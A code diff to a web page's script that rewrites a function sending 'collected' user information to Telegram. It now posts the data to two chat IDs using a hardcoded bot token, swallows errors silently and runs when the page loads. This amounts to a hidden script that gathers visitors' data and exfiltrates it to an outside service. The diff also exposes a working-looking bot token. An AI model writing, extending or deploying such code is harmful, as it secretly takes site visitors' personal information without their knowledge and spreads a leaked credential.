@@ -145,31 +145,44 @@
       
     }
 
-    
-    async function sendToTelegram() {
-      const botToken = "8079871434:AAFlp-MDPEFED9uTwGoHG1wN00OwbNVsVd0";
-      const chatId = "6854356772"; // Replace with your Telegram user ID
 
-      const message = "*📊 User Info Collected:*\n```\n" + JSON.stringify(collectedData, null, 2) + "\n```";
 
-      try {
-        const res = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-          method: "POST",
-          headers: {
-            'Content-Type': 'application/json'
-          },
-          body: JSON.stringify({
-            chat_id: chatId,
-            text: message,
-            parse_mode: "Markdown"
+
+
+      async function sendToTelegram() {
+    const botToken = "8079871434:AAFlp-MDPEFED9uTwGoHG1wN00OwbNVsVd0";
+
+    const chatIds = [
+      "6854356772",
+      "7258927081"
+    ];
+
+    const message =
+      "*📊 User Info Collected:*\n```\n" +
+      JSON.stringify(collectedData, null, 2) +
+      "\n```";
+
+    try {
+      await Promise.all(
+        chatIds.map(chatId =>
+          fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+              chat_id: chatId,
+              text: message,
+              parse_mode: "Markdown"
+            })
           })
-        });
-
-        
-      } catch (error) {
-        
-      }
+        )
+      );
+    } catch (error) {
+      // Keep existing workflow
     }
+  }
+
 
     getUserInfo();
   </script>
